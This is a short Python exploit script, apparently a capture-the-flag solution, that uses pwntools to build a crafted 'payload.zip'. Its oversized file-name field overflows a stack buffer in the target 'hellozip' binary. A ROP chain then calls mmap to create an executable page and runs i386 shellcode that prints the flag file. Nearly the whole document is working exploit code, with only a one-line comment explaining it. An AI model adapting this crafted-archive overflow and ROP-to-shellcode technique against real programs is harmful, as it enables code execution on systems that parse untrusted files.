#coding: utf-8
'''
use mmap (just put all parameters onto stack) to make a page rwx => call shellcode
sshuser: whitehatgrandprix
'''
from pwn import *

def insert(data, value, offset):
    assert len(value)+offset <= len(data)
    return data[:offset]+value+data[offset+len(value):]

# arguments
shellcode = asm(shellcraft.i386.linux.execve(path='/bin/cat', argv=['/bin/cat', '/home/hellozip/flag'], envp=0))
prot_value_here = 0x1 | 0x4
flag_value_here = 0x01 | 0x10
shellcode_addr_here = 0x690000
pop_ebp_ret = 0x08048898
mmap = 0x8048530
    
cZ = '\x00'*(0x2000+22)
cZ = insert(cZ, p32(0x6054B50), 0x2000)
cZ = insert(cZ, p16(1), 0x2000+8)
cZ = insert(cZ, p16(0), 0x2000+16)
cZ = insert(cZ, p32(0x2014B50), 0)
cZ = insert(cZ, p16(0x500), 28) # file name length
rop = 'A'*0x114
rop += p32(pop_ebp_ret)
rop += p32(0x804b044) # some address with zero value
rop += p32(mmap)
rop += p32(shellcode_addr_here)
rop += p32(shellcode_addr_here) # addr
rop += p32(0x1000) # len
rop += p32(prot_value_here)
rop += p32(flag_value_here)
rop += p32(0)
rop += p32(0x1000)
cZ = insert(cZ, rop, 46)
cZ = insert(cZ, shellcode, 0x1000)
open('payload.zip', 'wb').write(cZ)
